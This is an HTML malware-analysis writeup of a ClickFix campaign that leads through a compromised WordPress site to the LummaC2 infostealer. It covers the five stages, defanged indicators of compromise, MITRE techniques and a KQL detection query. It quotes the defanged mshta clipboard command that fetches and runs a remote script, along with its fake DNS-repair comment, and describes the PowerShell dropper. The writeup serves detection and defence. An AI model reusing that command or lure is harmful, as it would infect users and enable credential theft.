@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>INC-7987 - ClickFix LummaC2 via Compromised WordPress</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Epilogue:wght@400;500;700;900&display=swap');
+:root{--bg:#070a0f;--surface:#0c1119;--card:#0f1620;--border:#182438;--cyan:#00d9f5;--green:#3dff8f;--red:#ff4560;--orange:#ff7b2c;--yellow:#ffd166;--purple:#c084fc;--text:#a8c0d6;--muted:#3a5472;--white:#e8f0f8;}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;line-height:1.6;}
+body::before{content:'';position:fixed;inset:0;background:radial-gradient(ellipse 60% 40% at 10% 20%,rgba(255,123,44,.025) 0%,transparent 55%),linear-gradient(rgba(0,217,245,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(0,217,245,.015) 1px,transparent 1px);background-size:100%,44px 44px,44px 44px;pointer-events:none;z-index:0;}
+.wrap{max-width:960px;margin:0 auto;padding:52px 24px 90px;position:relative;z-index:1;}
+.nav{display:flex;align-items:center;gap:16px;margin-bottom:48px;font-size:11px;}
+.nav a{color:var(--muted);text-decoration:none;transition:color .15s;}
+.nav a:hover{color:var(--orange);}
+.nav span{color:var(--border);}
+.eyebrow{font-size:10px;letter-spacing:3px;text-transform:uppercase;color:var(--orange);display:flex;align-items:center;gap:10px;margin-bottom:16px;}
+.eyebrow::before{content:'';width:24px;height:1px;background:var(--orange);box-shadow:0 0 6px var(--orange);}
+h1{font-family:'Epilogue',sans-serif;font-size:clamp(20px,4vw,38px);font-weight:900;color:var(--white);line-height:1.05;margin-bottom:20px;}
+h1 span{color:var(--orange);}
+.meta{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:1px;background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:48px;}
+.mc{background:var(--card);padding:11px 14px;}
+.ml{font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--muted);margin-bottom:3px;}
+.mv{font-size:12px;font-weight:700;color:var(--white);}
+.mv.r{color:var(--red);}.mv.o{color:var(--orange);}.mv.g{color:var(--green);}.mv.c{color:var(--cyan);}.mv.y{color:var(--yellow);}
+.sec{margin-bottom:36px;}
+.sl{font-size:9px;letter-spacing:3px;text-transform:uppercase;color:var(--orange);margin-bottom:12px;display:flex;align-items:center;gap:8px;}
+.sl::after{content:'';flex:1;height:1px;background:var(--border);}
+.sl.r{color:var(--red);}.sl.g{color:var(--green);}.sl.c{color:var(--cyan);}.sl.y{color:var(--yellow);}
+p.pr{font-size:12px;color:var(--text);line-height:1.85;margin-bottom:12px;}
+p.pr strong{color:var(--white);}
+p.pr code{background:rgba(255,123,44,.08);border:1px solid rgba(255,123,44,.2);color:var(--orange);padding:1px 6px;border-radius:2px;font-size:11px;}
+.kc{display:flex;flex-wrap:wrap;border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:20px;}
+.kcs{flex:1;min-width:90px;background:var(--card);padding:12px 14px;border-right:1px solid var(--border);}
+.kcs:last-child{border-right:none;}
+.kcs.a{background:rgba(255,123,44,.04);border-bottom:2px solid var(--orange);}
+.kcs.a .kcn{color:var(--orange);}
+.kcnum{font-size:9px;color:var(--muted);margin-bottom:4px;}
+.kcn{font-size:11px;font-weight:700;color:var(--muted);margin-bottom:3px;}
+.kct{font-size:10px;color:var(--muted);}
+.stage{background:var(--card);border:1px solid var(--border);border-left:3px solid var(--orange);border-radius:4px;padding:14px 18px;margin-bottom:12px;}
+.stage-title{font-size:12px;font-weight:700;color:var(--orange);margin-bottom:8px;}
+.stage-body{font-size:12px;color:var(--text);line-height:1.8;}
+.stage-body code{background:rgba(255,123,44,.08);border:1px solid rgba(255,123,44,.15);color:var(--orange);padding:1px 6px;border-radius:2px;font-size:11px;}
+.it{width:100%;border-collapse:collapse;font-size:11px;margin-bottom:8px;}
+.it th{background:rgba(255,123,44,.06);border:1px solid var(--border);padding:8px 12px;text-align:left;font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--orange);}
+.it td{border:1px solid var(--border);padding:9px 12px;color:var(--text);vertical-align:top;}
+.it tr:hover td{background:rgba(255,255,255,.015);}
+.ioc-d{color:var(--orange);font-family:'JetBrains Mono',monospace;word-break:break-all;}
+.ioc-f{color:var(--yellow);}
+.bdg{display:inline-block;font-size:9px;padding:2px 7px;border-radius:2px;font-weight:700;letter-spacing:1px;text-transform:uppercase;}
+.bdg.r{background:rgba(255,69,96,.12);color:var(--red);border:1px solid rgba(255,69,96,.25);}
+.bdg.o{background:rgba(255,123,44,.12);color:var(--orange);border:1px solid rgba(255,123,44,.25);}
+.bdg.y{background:rgba(255,209,102,.12);color:var(--yellow);border:1px solid rgba(255,209,102,.25);}
+.mg{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;}
+.mc2{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:12px 14px;}
+.mid{font-size:10px;font-weight:700;color:var(--orange);margin-bottom:4px;}
+.mname{font-size:12px;color:var(--white);margin-bottom:4px;}
+.mtactic{font-size:10px;color:var(--muted);}
+.box{border-radius:6px;padding:14px 18px;font-size:12px;line-height:1.8;margin-bottom:14px;}
+.box.red{background:rgba(255,69,96,.04);border:1px solid rgba(255,69,96,.15);border-left:3px solid var(--red);}
+.box.green{background:rgba(61,255,143,.04);border:1px solid rgba(61,255,143,.15);border-left:3px solid var(--green);}
+.box.yellow{background:rgba(255,209,102,.04);border:1px solid rgba(255,209,102,.15);border-left:3px solid var(--yellow);}
+.box strong{color:var(--white);}
+.box code{background:rgba(255,255,255,.06);padding:1px 6px;border-radius:2px;font-size:11px;color:var(--yellow);}
+footer{margin-top:56px;padding-top:20px;border-top:1px solid var(--border);display:flex;justify-content:space-between;flex-wrap:wrap;gap:8px;font-size:10px;color:var(--muted);}
+@media(max-width:600px){.kc{flex-direction:column;}.kcs{border-right:none;border-bottom:1px solid var(--border);}}
+</style>
+</head>
+<body>
+<div class="wrap">
+<nav class="nav"><a href="index.html">← Portfolio</a><span>/</span><span style="color:var(--text)">INC-7987</span></nav>
+
+<header>
+  <div class="eyebrow">Incident Writeup * Malware Analysis</div>
+  <h1>INC-7987 - <span>ClickFix Attack Chain</span><br>LummaC2 Infostealer * mshta → PowerShell</h1>
+  <div class="meta">
+    <div class="mc"><div class="ml">ID</div><div class="mv c">INC-7987</div></div>
+    <div class="mc"><div class="ml">Date</div><div class="mv">30 Jan 2025</div></div>
+    <div class="mc"><div class="ml">Severity</div><div class="mv r">HIGH</div></div>
+    <div class="mc"><div class="ml">Verdict</div><div class="mv r">Malware Confirmed</div></div>
+    <div class="mc"><div class="ml">Technique</div><div class="mv o">ClickFix * LOTL</div></div>
+    <div class="mc"><div class="ml">Malware</div><div class="mv r">LummaC2 Infostealer</div></div>
+    <div class="mc"><div class="ml">Vector</div><div class="mv o">Compromised WP Site</div></div>
+    <div class="mc"><div class="ml">Analysis</div><div class="mv g">Windows Sandbox</div></div>
+  </div>
+</header>
+
+<div class="sec">
+  <div class="sl c">Executive Summary</div>
+  <p class="pr">Analiza zgłoszonej strony <code>ligohr[.]pl</code> (rekrutacje) wykazała aktywną kampanię <strong>ClickFix</strong>. Skompromitowana strona WordPress wstrzykiwała zewnętrzny skrypt z <code>rednosehorse[.]com</code>, wyświetlający fałszywy komunikat "Verification Failed - Network Error" i instruujący uruchomienie <strong>Win+R → Ctrl+V → Enter</strong>.</p>
+  <p class="pr">Pełny łańcuch ataku zrekonstruowany metodą statycznej analizy w izolowanym środowisku Windows Sandbox. Finalny payload - <strong>LummaC2 infostealer</strong> (<code>Update.exe</code>) - potwierdzony przez ANY.RUN. Technika wykorzystuje wyłącznie natywne narzędzia systemu Windows (LOTL), omijając kontrole EDR oparte na sygnaturach.</p>
+</div>
+
+<div class="sec">
+  <div class="sl">Attack Chain - 5-Stage Loader</div>
+  <div class="kc">
+    <div class="kcs a"><div class="kcnum">01</div><div class="kcn">Drive-by</div><div class="kct">ligohr[.]pl → JS</div></div>
+    <div class="kcs a"><div class="kcnum">02</div><div class="kcn">ClickFix</div><div class="kct">mshta clipboard</div></div>
+    <div class="kcs a"><div class="kcnum">03</div><div class="kcn">VBScript</div><div class="kct">WScript.Shell → PS</div></div>
+    <div class="kcs a"><div class="kcnum">04</div><div class="kcn">PS Dropper</div><div class="kct">ZIP download</div></div>
+    <div class="kcs a"><div class="kcnum">05</div><div class="kcn">LummaC2</div><div class="kct">Update.exe</div></div>
+  </div>
+</div>
+
+<div class="sec">
+  <div class="sl">Technical Analysis - Stage by Stage</div>
+
+  <div class="stage">
+    <div class="stage-title">Stage 1 - Initial Access (ligohr[.]pl)</div>
+    <div class="stage-body">Strona WordPress z zewnętrznym skryptem z <code>rednosehorse[.]com</code> wstrzykniętym przez tag &lt;script&gt;. Skrypt wyświetla overlay z fake reCAPTCHA i komunikatem o błędzie DNS, instruując uruchomienie dialogu Run. DevTools potwierdziły obecność skryptu w drzewie zasobów.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-title">Stage 2 - ClickFix Clipboard Execution</div>
+    <div class="stage-body">Po załadowaniu strony schowek systemu zostaje nadpisany komendą: <code>mshta hxxp[://]guaicui[.]com[.]br/wp-content/plugins/goodlayers-core-portfolio/layer[.]html # "Microsoft Windows: DNS service Reload and Restart UP"</code>. Komentarz po <code>#</code> to social engineering - ma wyglądać jak legalny komunikat systemowy w oknie Run.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-title">Stage 3 - VBScript Loader (layer.html)</div>
+    <div class="stage-body">Źródło strony zawiera VBScript z <code>WScript.Shell</code> wykonujący PowerShell z flagami <code>-NoProfile -ExecutionPolicy Bypass</code>. Payload zakodowany w Base64. Dekodowanie przez CyberChef ujawniło URL kolejnego stage: <code>guaicui[.]com[.]br/.../languages/es.txt</code></div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-title">Stage 4 - PowerShell Dropper (es.txt)</div>
+    <div class="stage-body">Skrypt PS pobiera ZIP z <code>guaicui[.]com[.]br/.../captcha/js/file.zip</code>, rozpakowuje do <code>%LOCALAPPDATA%\SystemCacheFiles\LocalApplicationDevelopment</code>, czeka 30 sekund, uruchamia <code>Update.exe</code>. Wykonuje geofencing check - IP ofiary przez <code>ifconfig.me</code> → POST do Google przed egzekucją.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-title">Stage 5 - LummaC2 Infostealer (Update.exe)</div>
+    <div class="stage-body">Finalny payload sklasyfikowany przez ANY.RUN jako LummaC2 - infostealer kradnący dane logowania, cookies przeglądarek i portfele kryptowalut.</div>
+  </div>
+
+  <div class="box red"><strong>⚠ Geofencing / Targeting:</strong> Skrypt sprawdza IP ofiary przed wykonaniem - <code>Invoke-RestMethod -Uri "https://ifconfig.me/ip"</code>. Wskazuje to na świadome targetowanie określonych regionów geograficznych lub wykluczanie środowisk sandbox/VPN.</div>
+</div>
+
+<div class="sec">
+  <div class="sl r">Indicators of Compromise</div>
+  <table class="it">
+    <thead><tr><th>Type</th><th>Indicator</th><th>Context</th><th>Stage</th></tr></thead>
+    <tbody>
+      <tr><td>Domain</td><td><span class="ioc-d">ligohr[.]pl</span></td><td>Compromised WP - initial access</td><td><span class="bdg o">Stage 1</span></td></tr>
+      <tr><td>Domain</td><td><span class="ioc-d">rednosehorse[.]com</span></td><td>ClickFix script hosting</td><td><span class="bdg o">Stage 1</span></td></tr>
+      <tr><td>Domain</td><td><span class="ioc-d">guaicui[.]com[.]br</span></td><td>Compromised WP - mshta target + dropper hosting</td><td><span class="bdg r">Stage 2–4</span></td></tr>
+      <tr><td>URL</td><td><span class="ioc-d">guaicui[.]com[.]br/.../layer[.]html</span></td><td>mshta payload - VBScript loader</td><td><span class="bdg r">Stage 2</span></td></tr>
+      <tr><td>URL</td><td><span class="ioc-d">guaicui[.]com[.]br/.../es.txt</span></td><td>PowerShell dropper script</td><td><span class="bdg r">Stage 3</span></td></tr>
+      <tr><td>URL</td><td><span class="ioc-d">guaicui[.]com[.]br/.../file.zip</span></td><td>Malware ZIP archive</td><td><span class="bdg r">Stage 4</span></td></tr>
+      <tr><td>File</td><td><span class="ioc-f">Update.exe</span></td><td>LummaC2 infostealer - final payload</td><td><span class="bdg r">Stage 5</span></td></tr>
+      <tr><td>Path</td><td><span class="ioc-f">%LOCALAPPDATA%\SystemCacheFiles\LocalApplicationDevelopment\</span></td><td>Dropper install path</td><td><span class="bdg y">IOC</span></td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="sec">
+  <div class="sl">MITRE ATT&amp;CK</div>
+  <div class="mg">
+    <div class="mc2"><div class="mid">T1189</div><div class="mname">Drive-by Compromise</div><div class="mtactic">Initial Access</div></div>
+    <div class="mc2"><div class="mid">T1204.002</div><div class="mname">User Execution - Malicious File</div><div class="mtactic">Execution</div></div>
+    <div class="mc2"><div class="mid">T1059.001</div><div class="mname">PowerShell</div><div class="mtactic">Execution</div></div>
+    <div class="mc2"><div class="mid">T1059.005</div><div class="mname">VBScript (mshta)</div><div class="mtactic">Execution</div></div>
+    <div class="mc2"><div class="mid">T1027</div><div class="mname">Obfuscated Files (Base64)</div><div class="mtactic">Defense Evasion</div></div>
+    <div class="mc2"><div class="mid">T1218.005</div><div class="mname">Mshta (LOTL)</div><div class="mtactic">Defense Evasion</div></div>
+    <div class="mc2"><div class="mid">T1105</div><div class="mname">Ingress Tool Transfer</div><div class="mtactic">C2</div></div>
+    <div class="mc2"><div class="mid">T1555 / T1539</div><div class="mname">Credential / Cookie Theft</div><div class="mtactic">Collection</div></div>
+  </div>
+</div>
+
+<div class="sec">
+  <div class="sl g">Detection Recommendations</div>
+  <div class="box green"><strong>LOTL Detection - KQL:</strong><br><code>DeviceProcessEvents | where FileName in~ ("mshta.exe","wscript.exe","cscript.exe") | where ProcessCommandLine has_any ("http://","https://") | where InitiatingProcessFileName !in~ ("explorer.exe") | project Timestamp, DeviceName, AccountName, ProcessCommandLine</code></div>
+  <div class="box yellow"><strong>ASR Rule:</strong> Włącz "Block execution of potentially obfuscated scripts" oraz "Block all Office applications from creating child processes". Rozważ blokowanie <code>mshta.exe</code> przez AppLocker/WDAC dla użytkowników nie-adminów.</div>
+</div>
+
+<footer><span>// INC-7987 * 30.01.2025 * Malware Analysis</span><span>Tools: Windows Sandbox * CyberChef * ANY.RUN * DevTools</span></footer>
+</div>
+</body>
+</html>
